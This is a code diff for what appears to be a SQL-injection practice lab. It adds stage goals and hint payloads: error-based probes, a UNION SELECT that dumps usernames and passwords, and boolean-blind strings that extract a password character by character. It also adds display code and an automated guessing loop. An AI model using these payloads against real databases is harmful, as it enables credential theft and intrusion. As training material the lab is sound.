@@ -6,17 +6,22 @@ const user = {
         {
             topic: "Error",
             title: "",
-            goal: "",
+            goal: "If you are not getting any more error then it’s done.",
             hint: [
                 "'",
+                "' ORDER BY 5 --",
+                "' HAVING 1=1 --",
+                "' GROUP BY table.columnfromerror1,... HAVING 1=1 --",
+                "' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --"
             ],
             status: 1,
         },
         {
             topic: "Union",
             title: "",
-            goal: "",
+            goal: "Try get username and password",
             hint: [
+                "' UNION SELECT ... FROM users--",
                 "' UNION SELECT NULL, username, password FROM users--"
             ],
             status: 1,
@@ -26,7 +31,10 @@ const user = {
             title: "",
             goal: "Response from server is true or false",
             hint: [
-                "' or 1=1--"
+                "' or 1=1--",
+                "' and IF (SELECT TOP 1 'x' FROM users)='x' --",
+                "' and (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'alice')='j'--",
+                "' and (SELECT SUBSTRING(password, $range$, 1) FROM users WHERE username = 'alice') ='$$'--"
             ],
             status: 1,
         },
@@ -43,7 +51,7 @@ const user = {
         {
             topic: "Out of band",
             title: "",
-            goal: "Try access to C driver",
+            goal: "",
             hint: [],
             status: 0,
         }
@@ -62,6 +70,9 @@ const user = {
     setDefault: function(){
         $("#user_st1").val(this.getCurStage().hint[0])
         $("#pass_st1").val("123")
+        this.getCurStage().hint.forEach(h => {
+            $("#hint-sql").append(`<p class="mb-1"><span class="badge bg-dark text-wrap text-start">${h}</span></p>`)
+        });
     },
     virtualBattle: function(){
         // {
@@ -117,6 +128,7 @@ $(document).ready(function () {
         let found = ""
         let username = formData["username"]
         const response = []
+        $("#list-response tbody").empty()
         for (let m = 0; m < maxL; m++) {
             for (let i = 0; i < letters.length; i++) {
                 formData["username"] = username.replace("$$", letters[i]).replace("$range$", m + 1)
@@ -127,6 +139,7 @@ $(document).ready(function () {
                     $("#list-response tbody").append(`
                     <tr>
                     <td>${res["data"]["timing"]}</td>
+                    <td>${res["data"]["data"]}</td>
                     <td>${letters[i]}</td>
                     </tr>
                     `)
